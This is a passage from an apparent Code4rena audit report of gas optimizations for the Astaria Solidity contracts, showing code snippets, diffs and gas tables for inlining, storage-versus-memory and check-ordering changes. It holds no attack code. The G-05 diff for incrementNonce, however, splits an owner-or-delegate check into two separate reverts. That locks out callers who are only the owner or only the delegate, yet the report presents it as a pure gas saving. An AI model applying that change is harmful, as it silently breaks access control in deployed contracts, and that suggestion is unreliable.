_handleProtocolFee(uint256 amount) internal returns (uint256) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    address feeTo = ROUTER().feeTo();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    IAstariaRouter _ROUTER = ROUTER();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address feeTo = _ROUTER.feeTo();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     bool feeOn = feeTo != address(0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (feeOn) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      uint256 fee = ROUTER().getProtocolFee(amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      uint256 fee = _ROUTER.getProtocolFee(amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         amount -= fee;</span></span></span></code></pre>\n<h2 id=\"g-03-internalprivate-functions-only-called-once-can-be-inlined-to-save-gas-gas-saved-20--20--400\" style=\"position:relative;\"><a href=\"#g-03-internalprivate-functions-only-called-once-can-be-inlined-to-save-gas-gas-saved-20--20--400\" aria-label=\"g 03 internalprivate functions only called once can be inlined to save gas gas saved 20  20  400 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-03] Internal/Private functions only called once can be inlined to save gas <code>Gas saved: 20 * 20 = 400</code></h2>\n<p>Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.</p>\n<p>Affected code:\n<code>Total Instances: 20</code></p>\n<p><em>Note: see warden’s <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/573\">original submission</a> for list of instances.</em></p>\n<h2 id=\"g-04-using-storage-instead-of-memory-for-structsarrays-saves-gas\" style=\"position:relative;\"><a href=\"#g-04-using-storage-instead-of-memory-for-structsarrays-saves-gas\" aria-label=\"g 04 using storage instead of memory for structsarrays saves gas permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-04] Using storage instead of memory for structs/arrays saves gas</h2>\n<p>When fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read. Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct.</p>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L562\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L562</a></p>\n<p><strong>Save 85 gas on average</strong>\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 166273    | 183609   | 176773 | 215828 |\n| After  | 166189    | 183525   | 176689 | 215761 |</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"227\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File:/</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">562</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">Asset</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">incomingAsset</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"228\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/CollateralToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/CollateralToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    Asset memory incomingAsset = s.idToUnderlying[collateralId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    Asset storage incomingAsset = s.idToUnderlying[collateralId];</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L390\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L390</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"229\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">390</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">Asset</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">().</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">391</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">collateralId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">392</span><span class=\"mtk1\">:    ];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">434</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">Asset</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlying</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">];</span></span></span></code></pre>\n<h2 id=\"g-05-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function-also-restructured-some-ifs\" style=\"position:relative;\"><a href=\"#g-05-require-or-revert-statements-that-check-input-arguments-should-be-at-the-top-of-the-function-also-restructured-some-ifs\" aria-label=\"g 05 require or revert statements that check input arguments should be at the top of the function also restructured some ifs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-05] require() or revert() statements that check input arguments should be at the top of the function (Also restructured some if’s)</h2>\n<p><strong>Fail early and cheaply</strong></p>\n<p>Checks that involve constants should come before checks that involve state variables, function calls, and calculations. By doing these checks first, the function is able to revert before wasting alot of gas in a function that may ultimately revert in the unhappy case.</p>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC721.sol#L106-L124\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC721.sol#L106-L124</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"230\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">ERC721</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">107:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">from</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">108:    </span><span class=\"mtk10\">address</span><span class=\"mtk1\"> </span><span class=\"mtk10\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">109:    </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">:  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">IERC721</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">111</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">ERC721Storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadERC721Slot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">113</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">from</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">_ownerOf</span><span class=\"mtk1\">[</span><span class=\"mtk12\">id</span><span class=\"mtk1\">], </span><span class=\"mtk8\">&quot;WRONG_FROM&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">115</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">to</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk8\">&quot;INVALID_RECIPIENT&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"231\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/ERC721.sol b/src/ERC721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 232ccb9..a31968e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/ERC721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/ERC721.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -108,12 +108,13 @@ abstract contract ERC721 is Initializable, IERC721 {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     address to,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     uint256 id</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   ) public virtual override(IERC721) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    require(to != address(0), &quot;INVALID_RECIPIENT&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ERC721Storage storage s = _loadERC721Slot();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     require(from == s._ownerOf[id], &quot;WRONG_FROM&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    require(to != address(0), &quot;INVALID_RECIPIENT&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     require(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       msg.sender == from ||</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         s.isApprovedForAll[from][msg.sender] ||</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L64-L71\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L64-L71</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"232\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">VaultImplementation</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">64</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">incrementNonce</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">65</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">VIData</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadVISlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">66</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">owner</span><span class=\"mtk1\">() &amp;&amp; </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">delegate</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">67</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidRequest</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidRequestReason</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUTHORITY</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">68</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategistNonce</span><span class=\"mtk1\">++;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">70</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">NonceUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">strategistNonce</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">71</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<p>Since we revert on two occassions ie <code>msg.sender != owner() &#x26;&#x26; msg.sender != s.delegate</code> which means that both of those conditions need to be true, we could save some gas used in evaluating the line <code>VIData storage s = _loadVISlot();</code> if it so happens that <code>msg.sender</code> is not equal to <code>owner()</code>. Working as it is, even if the first condition fails, we would have already sent some gas evaluating <code>VIData storage s = _loadVISlot();</code> Splitting the if’s would avoid the unneccessary wastage of gas incase we fail at the check <code>msg.sender != owner()</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"233\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/VaultImplementation.sol b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index b5ff5d7..ae86f0f 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/VaultImplementation.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -62,8 +62,11 @@ abstract contract VaultImplementation is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function incrementNonce() external {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (msg.sender != owner()){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+     revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     VIData storage s = _loadVISlot();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    if (msg.sender != owner() &amp;&amp; msg.sender != s.delegate) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (msg.sender != s.delegate) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       revert InvalidRequest(InvalidRequestReason.NO_AUTHORITY);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     s.strategistNonce++;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L524-L539\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/CollateralToken.sol#L524-L539</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"234\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">CollateralToken</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">524</span><span class=\"mtk1\">: </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">settleAuction</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">525</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">CollateralStorage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">s</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_loadCollateralSlot</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">526</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">527</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">collateralIdToAuction</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">] == </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">528</span><span class=\"mtk1\">:      </span><span class=\"mtk11\">ERC721</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenContract</span><span class=\"mtk1\">).</span><span class=\"mtk11\">ownerOf</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">529</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">idToUnderlying</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">tokenId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">530</span><span class=\"mtk1\">:      ) !=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">531</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">532</span><span class=\"mtk1\">:    ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">533</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">InvalidCollateralState</span><span class=\"mtk1\">(</span><span class=\"mtk12\">InvalidCollateralStates</span><span class=\"mtk1\">.</span><span class=\"mtk12\">NO_AUCTION</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">534</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">535</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">clearingHouse</span><span class=\"mtk1\">[</span><span class=\"mtk12\">collateralId</span><span class=\"mtk1\">]);</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"235\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/CollateralToken.sol b/src/CollateralToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index c82b400..6640cca 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/CollateralToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/CollateralToken.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -523,6 +523,8 @@ contract CollateralToken is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   function settleAuction(uint256 collateralId) public {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     CollateralStorage storage s = _loadCollateralSlot();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    require(msg.sender == s.clearingHouse[collateralId]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       s.collateralIdToAuction[collateralId] == bytes32(0) &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       ERC721(s.idToUnderlying[collateralId].tokenContract).ownerOf(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -532,7 +534,6 @@ contract CollateralToken is</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       revert InvalidCollateralState(InvalidCollateralStates.NO_AUCTION);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    require(msg.sender == s.clearingHouse[collateralId]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _settleAuction(s, collateralId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     delete s.idToUnderlying[collateralId];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     _burn(collateralId);</span></span></span></code></pre>\n<p><a 